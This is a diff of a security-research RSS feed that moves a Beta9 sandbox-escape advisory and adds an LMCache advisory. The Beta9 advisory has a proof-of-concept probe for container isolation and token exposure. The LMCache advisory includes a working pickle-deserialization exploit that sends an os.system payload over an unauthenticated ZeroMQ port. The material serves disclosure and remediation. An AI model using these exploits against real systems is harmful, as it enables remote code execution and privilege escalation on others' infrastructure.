@@ -4,423 +4,11 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Sun, 01 Nov 2026 13:26:19 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 01 Nov 2026 13:26:50 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
-        <item>
-            <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306-jfsa-2026-001699275/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306-jfsa-2026-001699275/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
-
-
-## Component
-
-Beta9 worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-worker < 0.1.756
-
-## Description
-
-Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable.
-
-That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`.
-
-Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-Any workspace token is enough. No pool selector, custom base image, or Docker option is required.
-
-```
-pip install beta9
-beta9 configure
-```
-
-<br>
-
-**Step 2 - Save the read-only probe**
-
-<br>
-
-The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache.
-
-```
-#!/usr/bin/env python3
-import base64
-import re
-import sys
-import uuid
-
-from beta9.abstractions.image import Image
-from beta9.clients.image import BuildImageRequest
-
-MARK = "B9PROBE"
-
-PROBE = r"""
-set -u
-M=B9PROBE
-R=/proc/1/root
-
-echo "$M uid=$(id -u) pid=$$"
-echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)"
-echo "$M pidns_self=$(readlink /proc/self/ns/pid)"
-echo "$M userns_self=$(readlink /proc/self/ns/user)"
-echo "$M netns_self=$(readlink /proc/self/ns/net)"
-echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')"
-echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')"
-echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)"
-echo "$M pidns_init=$(readlink /proc/1/ns/pid)"
-echo "$M userns_init=$(readlink /proc/1/ns/user)"
-
-if [ -e "$R/usr/local/sbin/runc" ]; then
-  echo "$M worker_runc=present"
-else
-  echo "$M worker_runc=absent"
-fi
-
-if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
-  echo "$M sa_token=readable"
-else
-  echo "$M sa_token=unreachable"
-fi
-
-if [ -d "$R/images" ]; then
-  echo "$M images_mount=present"
-else
-  echo "$M images_mount=absent"
-fi
-
-exit 0
-"""
-
-
-def probe_command() -> str:
-    blob = base64.b64encode(PROBE.encode()).decode()
-    return f"echo {blob} | base64 -d | sh  # {uuid.uuid4().hex}"
-
-
-def run_build(command: str):
-    log = []
-    for resp in Image(python_version="python3", commands=[command]).stub.build_image(
-        BuildImageRequest(
-            python_version="python3",
-            commands=[command],
-            ignore_python=True,
-        )
-    ):
-        if resp.msg:
-            sys.stdout.write(resp.msg)
-            sys.stdout.flush()
-            log.extend(line for line in resp.msg.splitlines() if MARK in line)
-        if resp.done:
-            break
-    return log
-
-
-def parse(log):
-    facts = {}
-    for line in log:
-        tail = line.split(MARK, 1)[1]
-        for key, value in re.findall(r"(\w+)=(\S+)", tail):
-            facts[key] = value
-    return facts
-
-
-def has_dac_override(cap_hex: str) -> bool:
-    try:
-        return bool(int(cap_hex, 16) & 0x2)
-    except ValueError:
-        return False
-
-
-def main() -> int:
-    facts = parse(run_build(probe_command()))
-    if not facts:
-        print("\nINCONCLUSIVE: the build log carried no probe output")
-        return 2
-
-    print("\nProbe results")
-    for key in sorted(facts):
-        print(f"  {key} = {facts[key]}")
-
-    neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "")
-    dac_override = has_dac_override(facts.get("caps_self", "0"))
-    print()
-    if neighbour and dac_override:
-        print(
-            f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid "
-            f"{facts.get('pid')} inside the worker's own PID and user namespaces, "
-            f"resolved the worker container's filesystem at /proc/1/root, and holds "
-            f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem"
-        )
-        return 1
-
-    print("NOT VULNERABLE: the build step saw only its own container")
-    return 0
-
-
-if __name__ == "__main__":
-    raise SystemExit(main())
-```
-
-<br>
-
-**Step 3 - Run the probe**
-
-<br>
-
-```
-python3 poc_beta9_build_isolation.py
-```
-
-<br>
-
-Expected output on a worker before 0.1.756:
-
-```
-VULNERABLE: the build step ran as uid 0 as pid <host pid> inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem
-```
-
-<br>
-
-The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`.
-
-## Vulnerability Mitigations
-
-Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120306
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
-
-
-## Component
-
-Beta9 worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-worker < 0.1.756
-
-## Description
-
-Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable.
-
-That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`.
-
-Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-Any workspace token is enough. No pool selector, custom base image, or Docker option is required.
-
-```
-pip install beta9
-beta9 configure
-```
-
-<br>
-
-**Step 2 - Save the read-only probe**
-
-<br>
-
-The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache.
-
-```
-#!/usr/bin/env python3
-import base64
-import re
-import sys
-import uuid
-
-from beta9.abstractions.image import Image
-from beta9.clients.image import BuildImageRequest
-
-MARK = "B9PROBE"
-
-PROBE = r"""
-set -u
-M=B9PROBE
-R=/proc/1/root
-
-echo "$M uid=$(id -u) pid=$$"
-echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)"
-echo "$M pidns_self=$(readlink /proc/self/ns/pid)"
-echo "$M userns_self=$(readlink /proc/self/ns/user)"
-echo "$M netns_self=$(readlink /proc/self/ns/net)"
-echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')"
-echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')"
-echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)"
-echo "$M pidns_init=$(readlink /proc/1/ns/pid)"
-echo "$M userns_init=$(readlink /proc/1/ns/user)"
-
-if [ -e "$R/usr/local/sbin/runc" ]; then
-  echo "$M worker_runc=present"
-else
-  echo "$M worker_runc=absent"
-fi
-
-if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
-  echo "$M sa_token=readable"
-else
-  echo "$M sa_token=unreachable"
-fi
-
-if [ -d "$R/images" ]; then
-  echo "$M images_mount=present"
-else
-  echo "$M images_mount=absent"
-fi
-
-exit 0
-"""
-
-
-def probe_command() -> str:
-    blob = base64.b64encode(PROBE.encode()).decode()
-    return f"echo {blob} | base64 -d | sh  # {uuid.uuid4().hex}"
-
-
-def run_build(command: str):
-    log = []
-    for resp in Image(python_version="python3", commands=[command]).stub.build_image(
-        BuildImageRequest(
-            python_version="python3",
-            commands=[command],
-            ignore_python=True,
-        )
-    ):
-        if resp.msg:
-            sys.stdout.write(resp.msg)
-            sys.stdout.flush()
-            log.extend(line for line in resp.msg.splitlines() if MARK in line)
-        if resp.done:
-            break
-    return log
-
-
-def parse(log):
-    facts = {}
-    for line in log:
-        tail = line.split(MARK, 1)[1]
-        for key, value in re.findall(r"(\w+)=(\S+)", tail):
-            facts[key] = value
-    return facts
-
-
-def has_dac_override(cap_hex: str) -> bool:
-    try:
-        return bool(int(cap_hex, 16) & 0x2)
-    except ValueError:
-        return False
-
-
-def main() -> int:
-    facts = parse(run_build(probe_command()))
-    if not facts:
-        print("\nINCONCLUSIVE: the build log carried no probe output")
-        return 2
-
-    print("\nProbe results")
-    for key in sorted(facts):
-        print(f"  {key} = {facts[key]}")
-
-    neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "")
-    dac_override = has_dac_override(facts.get("caps_self", "0"))
-    print()
-    if neighbour and dac_override:
-        print(
-            f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid "
-            f"{facts.get('pid')} inside the worker's own PID and user namespaces, "
-            f"resolved the worker container's filesystem at /proc/1/root, and holds "
-            f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem"
-        )
-        return 1
-
-    print("NOT VULNERABLE: the build step saw only its own container")
-    return 0
-
-
-if __name__ == "__main__":
-    raise SystemExit(main())
-```
-
-<br>
-
-**Step 3 - Run the probe**
-
-<br>
-
-```
-python3 poc_beta9_build_isolation.py
-```
-
-<br>
-
-Expected output on a worker before 0.1.756:
-
-```
-VULNERABLE: the build step ran as uid 0 as pid <host pid> inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem
-```
-
-<br>
-
-The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`.
-
-## Vulnerability Mitigations
-
-Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120306
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
         <item>
             <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
@@ -622,6 +210,212 @@ The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf000
 
 ## References
 https://www.cve.org/CVERecord?id=CVE-2026-120307
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306-jfsa-2026-001699275/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306-jfsa-2026-001699275/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120306, CRITICAL, Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation
+
+
+## Component
+
+Beta9 worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+worker < 0.1.756
+
+## Description
+
+Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on a build worker. The worker image sets `BUILDAH_ISOLATION=chroot`, and no `buildah` invocation passes `--isolation`, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds `CAP_DAC_OVERRIDE`. Pid 1 in that procfs is the worker entrypoint, so `/proc/1/root` is the worker container's filesystem and is writable.
+
+That filesystem holds `runc`, `buildah`, and `runsc`, the binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. A read-only probe confirmed the shared namespaces, `CAP_DAC_OVERRIDE`, and that the worker `runc` binary is visible at `/proc/1/root`.
+
+Worker 0.1.756 runs Buildah RUN steps, including the WORKDIR mkdir, under OCI isolation with private PID, IPC, and network namespaces. Tenant build arguments are passed into the build container rather than into the Buildah process environment.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+Any workspace token is enough. No pool selector, custom base image, or Docker option is required.
+
+```
+pip install beta9
+beta9 configure
+```
+
+<br>
+
+**Step 2 - Save the read-only probe**
+
+<br>
+
+The probe reports uid, namespace identity, the effective capability mask, and whether the worker's `runc` binary and service-account token path are visible through `/proc/1/root`. It does not write, delete, or print secret material. The nonce on the RUN line keeps the build off the image cache.
+
+```
+#!/usr/bin/env python3
+import base64
+import re
+import sys
+import uuid
+
+from beta9.abstractions.image import Image
+from beta9.clients.image import BuildImageRequest
+
+MARK = "B9PROBE"
+
+PROBE = r"""
+set -u
+M=B9PROBE
+R=/proc/1/root
+
+echo "$M uid=$(id -u) pid=$$"
+echo "$M caps_self=$(awk '/^CapEff/{print $2}' /proc/self/status)"
+echo "$M pidns_self=$(readlink /proc/self/ns/pid)"
+echo "$M userns_self=$(readlink /proc/self/ns/user)"
+echo "$M netns_self=$(readlink /proc/self/ns/net)"
+echo "$M visible_pids=$(ls /proc | grep -c '^[0-9][0-9]*$')"
+echo "$M init_cmd=$(tr '\0' ' ' < /proc/1/cmdline | tr -s ' ' '_')"
+echo "$M caps_init=$(awk '/^CapEff/{print $2}' /proc/1/status)"
+echo "$M pidns_init=$(readlink /proc/1/ns/pid)"
+echo "$M userns_init=$(readlink /proc/1/ns/user)"
+
+if [ -e "$R/usr/local/sbin/runc" ]; then
+  echo "$M worker_runc=present"
+else
+  echo "$M worker_runc=absent"
+fi
+
+if [ -r "$R/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
+  echo "$M sa_token=readable"
+else
+  echo "$M sa_token=unreachable"
+fi
+
+if [ -d "$R/images" ]; then
+  echo "$M images_mount=present"
+else
+  echo "$M images_mount=absent"
+fi
+
+exit 0
+"""
+
+
+def probe_command() -> str:
+    blob = base64.b64encode(PROBE.encode()).decode()
+    return f"echo {blob} | base64 -d | sh  # {uuid.uuid4().hex}"
+
+
+def run_build(command: str):
+    log = []
+    for resp in Image(python_version="python3", commands=[command]).stub.build_image(
+        BuildImageRequest(
+            python_version="python3",
+            commands=[command],
+            ignore_python=True,
+        )
+    ):
+        if resp.msg:
+            sys.stdout.write(resp.msg)
+            sys.stdout.flush()
+            log.extend(line for line in resp.msg.splitlines() if MARK in line)
+        if resp.done:
+            break
+    return log
+
+
+def parse(log):
+    facts = {}
+    for line in log:
+        tail = line.split(MARK, 1)[1]
+        for key, value in re.findall(r"(\w+)=(\S+)", tail):
+            facts[key] = value
+    return facts
+
+
+def has_dac_override(cap_hex: str) -> bool:
+    try:
+        return bool(int(cap_hex, 16) & 0x2)
+    except ValueError:
+        return False
+
+
+def main() -> int:
+    facts = parse(run_build(probe_command()))
+    if not facts:
+        print("\nINCONCLUSIVE: the build log carried no probe output")
+        return 2
+
+    print("\nProbe results")
+    for key in sorted(facts):
+        print(f"  {key} = {facts[key]}")
+
+    neighbour = facts.get("worker_runc") == "present" or "worker" in facts.get("init_cmd", "")
+    dac_override = has_dac_override(facts.get("caps_self", "0"))
+    print()
+    if neighbour and dac_override:
+        print(
+            f"VULNERABLE: the build step ran as uid {facts.get('uid')} as pid "
+            f"{facts.get('pid')} inside the worker's own PID and user namespaces, "
+            f"resolved the worker container's filesystem at /proc/1/root, and holds "
+            f"CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem"
+        )
+        return 1
+
+    print("NOT VULNERABLE: the build step saw only its own container")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+<br>
+
+**Step 3 - Run the probe**
+
+<br>
+
+```
+python3 poc_beta9_build_isolation.py
+```
+
+<br>
+
+Expected output on a worker before 0.1.756:
+
+```
+VULNERABLE: the build step ran as uid 0 as pid <host pid> inside the worker's own PID and user namespaces, resolved the worker container's filesystem at /proc/1/root, and holds CAP_DAC_OVERRIDE, which bypasses permission checks on that filesystem
+```
+
+<br>
+
+The lines above that verdict include `worker_runc = present`, a `caps_self` mask with the `CAP_DAC_OVERRIDE` bit set, an `init_cmd` naming the worker entrypoint, and a `visible_pids` count covering the worker pod. On worker 0.1.756 or later the same build prints `NOT VULNERABLE: the build step saw only its own container`.
+
+## Vulnerability Mitigations
+
+Upgrade the Beta9 worker to 0.1.756 or later. That release drops chroot isolation. Buildah RUN steps use OCI isolation with private PID, IPC, and network namespaces, and tenant build arguments are applied inside the build container.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released as worker 0.1.756 on 2026-09-15. Gateway 0.1.776 is the gateway tag cut from the same commit. The isolation change is in the worker image.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120306
 https://github.com/beam-cloud/beta9/pull/1897
 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
@@ -1699,6 +1493,148 @@ JFrog Xray and JFrog Curation detect the malicious `litellm` 1.107.0 using XRAY-
 - Temporary paths: `/tmp/.pc_sq_*` and `/tmp/.pc_e_*`
 - LiteLLM database targets: `LiteLLM_CredentialsTable` and `LiteLLM_ProxyModelTable`
 - Community tracking: [open LiteLLM security issue #47826](https://github.com/BerriAI/litellm/issues/47826)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/lmcache-is-vulnerable-to-unauthenticated-remote-code-execution-via-pickle-deserialization-on-the-multiprocess-zmq-transport-cve-2026-105192-jfsa-2026-001694382/</guid>
+            <pubDate>Wed, 07 Oct 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-105192, CRITICAL, LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport
+
+
+## Component
+
+lmcache (github.com/LMCache/LMCache)
+
+## Affected versions
+
+>= 0.3.9, < 0.5.6
+
+## Description
+
+LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with `--host`, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.
+
+Messages on the socket are msgpack. Extension code 1 is registered for `DeviceIPCWrapper` and is passed to `DeviceIPCWrapper.Deserialize` in `lmcache/v1/platform/base/ipc_wrapper.py`, which calls `pickle.loads`. That hook runs from `ext_hook` in `lmcache/v1/multiprocess/custom_types.py` while the server is still decoding `REGISTER_KV_CACHE` arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.
+
+The decode path shipped in v0.3.9 and is present through v0.5.5, including the v0.5.6 release candidates through v0.5.6rc3. v0.5.6, published on 2026-10-14, removes `pickle.loads` from this path.
+
+## PoC
+
+<br>
+
+**Step 1 - Start multiprocess mode bound to a routable address**
+
+<br>
+
+This is the documented multi-node setting. The ZMQ transport listens on port 5555.
+
+```
+python -m lmcache.v1.multiprocess.http_server \
+    --http-host 127.0.0.1 --http-port 8080 \
+    --host 0.0.0.0 --port 5555 \
+    --l1-size-gb 0.25 --eviction-policy LRU \
+    --hash-algorithm blake3 --instance-id mp-node-01
+```
+
+<br>
+
+**Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle**
+
+<br>
+
+Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes `id` to `/tmp/zmq_pwn`.
+
+```
+import os
+import pickle
+import msgspec
+import zmq
+
+class EvilPayload:
+    def __init__(self, cmd):
+        self.cmd = cmd
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+
+evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))
+
+REGISTER_KV_CACHE = 1
+EXT_CODE = 1
+NUM_PAYLOADS = 7
+KVCACHE_INDEX = 1
+
+b_uid = msgspec.msgpack.encode(0)
+b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
+payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
+payloads[0] = msgspec.msgpack.encode(0)
+payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
+    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
+)
+frames = [b_uid, b_type, *payloads]
+```
+
+<br>
+
+**Step 3 - Send the frame**
+
+<br>
+
+```
+ctx = zmq.Context()
+s = ctx.socket(zmq.DEALER)
+s.connect("tcp://127.0.0.1:5555")
+s.send_multipart(frames)
+```
+
+<br>
+
+The pickle runs during argument decode. The server then logs a type error for `REGISTER_KV_CACHE` because the handler expected a `DeviceIPCWrapper` and received the return value of `os.system`. That error is after the command has already run.
+
+<br>
+
+**Step 4 - Confirm the command ran as the LMCache user**
+
+<br>
+
+```
+cat /tmp/zmq_pwn
+```
+
+<br>
+
+Expected output on an official image, where the process runs as root:
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Vulnerability Mitigations
+
+Upgrade to LMCache 0.5.6 or later. That release replaces pickle in device IPC descriptors with versioned, typed MessagePack descriptors. Descriptors are validated before use, the wrapper type is chosen from a fixed local allowlist, and class names are never taken from the message. The change covers the ZeroMQ and gRPC paths, and there is no pickle fallback. The wire format changed, so upgrade workers and servers together. The change is https://github.com/LMCache/LMCache/pull/5644, and it is in the v0.5.6 tag.
+
+LMCache's note on the fix is https://blog.lmcache.ai/en/2026/10/13/an-update-on-cve-2026-105192/.
+
+Two related changes were announced with that note and merged after the v0.5.6 tag was cut (tag commit 3e11e10, 2026-10-12). They are included in v0.5.7rc2. https://github.com/LMCache/LMCache/pull/5684 binds the example Kubernetes deployment to localhost. https://github.com/LMCache/LMCache/pull/5685 runs the official images as a non-root user. The v0.5.6 example deployment still passes `--host 0.0.0.0`, and the v0.5.6 images still run as root.
+
+On any version before 0.5.6, keep the multiprocess port on localhost or on a trusted cluster network, and limit the port with a firewall. Any host that can open a connection to the port can still run code as the LMCache user.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-105192
+https://blog.lmcache.ai/en/2026/10/13/an-update-on-cve-2026-105192/
+https://github.com/LMCache/LMCache/security/advisories/GHSA-w5f2-9q9c-ff4h
+https://github.com/LMCache/LMCache/pull/5644
+https://github.com/LMCache/LMCache/pull/5684
+https://github.com/LMCache/LMCache/pull/5685
+https://github.com/LMCache/LMCache/releases/tag/v0.5.6
+https://github.com/LMCache/LMCache
+https://pypi.org/project/lmcache/
+https://github.com/LMCache/LMCache/blob/v0.5.5/lmcache/v1/platform/base/ipc_wrapper.py
+https://github.com/LMCache/LMCache/blob/v0.3.9/lmcache/v1/multiprocess/custom_types.py
 ]]></content:encoded>
         </item>
     </channel>
